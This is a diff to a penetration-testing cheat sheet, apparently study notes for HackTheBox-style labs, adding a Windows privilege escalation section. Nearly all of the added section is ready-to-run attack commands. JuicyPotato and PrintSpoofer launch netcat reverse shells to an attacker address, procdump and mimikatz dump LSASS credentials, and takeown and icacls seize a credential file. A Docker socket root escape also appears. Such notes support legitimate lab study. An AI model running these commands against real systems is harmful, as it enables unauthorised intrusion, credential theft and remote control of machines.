@@ -26,7 +26,8 @@ Enumeration, exploitation, and privilege escalation notes, all in one place.
     - [msfvenom](#msfvenom)
 - [Privilege Escalation](#privilege-escalation)
   - [Linux PE](#linux-pe)
-- [Arsenal](#arsenal)
+  - [Windows PE](#windows-pe)
+()- [Arsenal](#arsenal)
   - [TMUX](#tmux)
   - [Python Virtual Environment](#python-virtual-enviroment)
   - [File Transfers](#file-transfers)
@@ -295,6 +296,51 @@ srw-rw---- 1 root docker 0 Mar  1  2025 /var/run/docker.sock
 # Spawn an interactive shell as root
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 ```
+## Windows PE
+### Privileges
+```cmd
+
+# Lists user privileges
+whoami /priv
+
+# SeImpersonate and SeAssignPrimaryToken
+c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe <YOUR_IP> <PORT> -e cmd.exe" -t *
+c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe <YOUR_IP> <PORT> -e cmd"
+
+# If CLSID is required
+reg query HKCR\CLSID /s /f LocalService
+
+HKEY_CLASSES_ROOT\CLSID\{8BC3F05E-D86B-11D0-A075-00C04FB68820}
+    LocalService    REG_SZ    winmgmt
+
+HKEY_CLASSES_ROOT\CLSID\{C49E32C6-BC8B-11d2-85D4-00105A1F8304}
+    LocalService    REG_SZ    winmgmt
+
+.\juicypotato.exe -l 1337 -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}" -p c:\windows\system32\cmd.exe -a " /c c:\windows\temp\nc.exe -e cmd.exe 10.10.16.2 1337" -t *
+
+# SeDebugPrivilege
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+mimikatz # log
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonpasswords
+
+# SeTakeOwnershipPrivilege
+Import-Module .\Enable-Privilege.ps1
+PS C:\htb> .\EnableAllTokenPrivs.ps1
+
+# Choosing a taget
+Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
+
+# Checking Ouwnership and taking ownership of file
+cmd /c dir /q 'C:\Department Shares\Private\IT'
+
+takeown /f 'C:\Department Shares\Private\IT\cred.txt'
+
+# Modifying ACL if needed
+icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
+```
+
 # Arsenal
 ## TMUX
 ```bash
